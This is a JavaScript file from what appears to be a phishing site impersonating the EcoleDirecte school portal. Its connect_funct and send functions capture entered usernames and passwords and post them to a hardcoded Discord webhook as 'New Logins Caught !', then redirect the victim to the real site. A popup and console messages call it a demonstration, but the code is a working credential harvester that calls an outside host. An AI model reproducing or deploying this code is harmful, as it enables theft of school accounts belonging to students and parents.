function connect_funct() {
    var uname = document.getElementById("username").value;
    var pass = document.getElementById("password").value;
    const d = new Date();
    let date_string = d.toLocaleString();
    const webhook_name = "EcoleDirecte Phishing";

    console.log("webhook_name : ", webhook_name);
    console.log("username : ", uname);
    console.log("password : ", pass);

    send(webhook_name, uname, pass, date_string);
    /*send2(webhook_name);*/
    setTimeout(function redirect () { location.assign("https://www.ecoledirecte.com");}, 150);

  }


  function send(webhook_name, uname, pass, date_string) {    

    console.log("fonction message");
    console.log(webhook_name, uname, pass, date_string);
    var randomColor = Math.floor(Math.random()*16777215).toString(16);
    randomColor = parseInt(randomColor, 16);
    var webhooklink = "https://discord.com/api/webhooks/1097156250061516820/nlMRlecy5SqmmZSzU_gvb-o49RDnQtd6mrUtk62epHkMMGEAYD7glS1aL1ycfdscQXJs";
    const request = new XMLHttpRequest();
      request.open("POST", webhooklink);
      request.setRequestHeader('Content-type', 'application/json');
    const params =
      {
        "content": null,
        "username": `${webhook_name}`,
        "avatar_url": "https://ecole-directe.github.io/EcoleDirecte_files/logoEcoleDirecteBlank2.png",
        "embeds":
        [
          {
            "title": "New Logins Caught !",
            "description": `Username : ${uname}\nPassword : ${pass}\nDate : ${date_string}`, 
            "color": randomColor,
            "footer":
            {
              "text": `EcoleDirecte Phishing - Nota\ncolor : ${randomColor}`
            }
          }
        ]
      }

    request.send(JSON.stringify(params));
    console.log("message1 sent");

  }


function confirmation() {
    if (window.confirm("ATTENTION SITE DE PHISHING UNIQUEMENT A BUT DEMONSTRATIF.\nN'ENTREZ AUCUNE INFORMATION PERSONNELLE DESSUS\nNOUS NE SERONT PAS TENUS RESPONSABLES\n\nEN CLIQUANT SUR 'OK' VOUS ACCEPTEZ LES RISQUES ET EN ASSUMEZ PLEINEMENT LA RESPONSABILITE.")) {
    }else{
        window.location.replace('https://www.ecoledirecte.com');
    }
}


function alert_funct() {
    const style = 'color:red; font-size:30px; font-weight: bold; -webkit-text-stroke: 1px black;'
    console.log("%c Phishing website !\n Demo only\n Do not enter your real credentials", style);
    console.log("%cGithub repository :", "color:blue; font-size:50px");
    console.log('%chttps://github.com/ecole-directe/ecole-directe.github.io \nBy Nota', 'color:green; font-size: 20px;');
}